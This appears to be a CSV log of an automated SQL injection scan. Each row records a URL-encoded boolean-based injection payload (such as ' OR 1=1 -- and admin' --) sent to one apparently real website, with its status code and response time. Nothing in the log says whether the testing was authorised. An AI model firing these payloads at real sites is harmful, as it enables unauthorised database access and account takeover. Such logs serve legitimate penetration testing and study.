URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.41295838356018066,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.38047146797180176,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.38411879539489746,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4123356342315674,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.410808801651001,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5443699359893799,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5451059341430664,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.5617737770080566,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.5593910217285156,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.5613346099853516,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.5616710186004639,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.37493228912353516,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3821263313293457,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.3825860023498535,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3784351348876953,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.48774194717407227,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4850344657897949,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6737394332885742,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.6740491390228271,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.4570467472076416,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.638725996017456,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.4581944942474365,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.638852596282959,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.4712703227996826,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.6532487869262695,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7324028015136719,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.4812643527984619,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8197791576385498,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.48143553733825684,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.3406522274017334,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.34810566902160645,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.014894962310791,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.0177834033966064,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.0192079544067383,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.023878574371338,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.0431265830993652,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.624194860458374,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.6245436668395996,admin' #
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.3136670589447021,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.8240082263946533,' OR 1=1--
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.7072813510894775,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.9652764797210693,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.9555482864379883,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.9537246227264404,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.9573237895965576,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.9640288352966309,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.9687418937683105,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.9661388397216797,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.6324129104614258,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.9020416736602783,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.908214807510376,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.9796605110168457,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.6167821884155273,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.5989205837249756,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8892219066619873,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.8841464519500732,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.8848237991333008,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.9721338748931885,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,2.0055620670318604,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.9061014652252197,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.424924612045288,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.8818938732147217,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8829870223999023,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.8628404140472412,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.861682653427124,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.8548624515533447,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.8221917152404785,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.865941047668457,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.8666701316833496,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.8944501876831055,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.8884453773498535,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.823939323425293,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8248915672302246,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.3326382637023926,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.7977957725524902,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.8045868873596191,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.9096882343292236,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.9077258110046387,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.8107750415802002,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.259033441543579,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.6909637451171875,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1993863582611084,admin' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.202885627746582,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.2041089534759521,admin' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.6391491889953613,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1517670154571533,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.6258716583251953,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.1713635921478271,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.6441068649291992,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.1381688117980957,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.6219065189361572,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.1403732299804688,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.607978105545044,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1191210746765137,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1142354011535645,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1109349727630615,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1576881408691406,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1615328788757324,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.6851825714111328,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1067984104156494,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.7627642154693604,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.098524808883667,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.7185637950897217,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.151707649230957,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.156327724456787,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.1484594345092773,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1532471179962158,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1163275241851807,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.1010618209838867,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.7600195407867432,' OR 1=1#
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1576435565948486,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.1550023555755615,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.744497537612915,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.137941598892212,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.136854887008667,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.745166301727295,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1500883102416992,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.7391276359558105,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.1302235126495361,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1649961471557617,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1612229347229004,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.7383191585540771,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.144946813583374,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.7332782745361328,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.5824506282806396,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.7530345916748047,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.7109017372131348,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.7096679210662842,admin' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5468475818634033,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.47751736640930176,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.16902518272399902,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.16035056114196777,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.18794512748718262,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.188096284866333,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.19255948066711426,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.19371247291564941,admin' #
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.19260144233703613,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.19700312614440918,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.7880165576934814,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,2.003404140472412,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.8138864040374756,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.1841440200805664,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.18021678924560547,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.13565874099731445,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.12072420120239258,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.11773562431335449,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.1256554126739502,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.12308716773986816,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.12486529350280762,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.1108860969543457,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.11068153381347656,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.11506152153015137,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.15096402168273926,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.15482735633850098,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.9057705402374268,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.14978551864624023,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.18676233291625977,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.18244504928588867,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.48439574241638184,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.18003511428833008,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.17696356773376465,admin' --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.1890113353729248,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.18940973281860352,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.19331645965576172,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.1927802562713623,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.24022674560546875,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.3643684387207031,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.7890324592590332,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3880043029785156,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4041907787322998,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.4491424560546875,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.45075511932373047,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.40642857551574707,admin' #
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3938570022583008,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4500923156738281,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4227602481842041,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4420967102050781,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4360086917877197,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.4382932186126709,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.4386167526245117,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4250526428222656,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4125964641571045,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.37955784797668457,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.8350098133087158,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3811073303222656,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.37918710708618164,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3941826820373535,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.38962721824645996,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.7716948986053467,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.35288119316101074,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.992809534072876,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.3996827602386475,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.2937309741973877,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.0861692428588867,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.3914306163787842,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2922558784484863,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.0899395942687988,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,2.0235471725463867,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1142222881317139,admin' #
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.3934383392333984,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.085200309753418,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.3904035091400146,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,2.005603551864624,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.0933640003204346,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.3979227542877197,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2667593955993652,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.2266507148742676,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.0905580520629883,admin' --
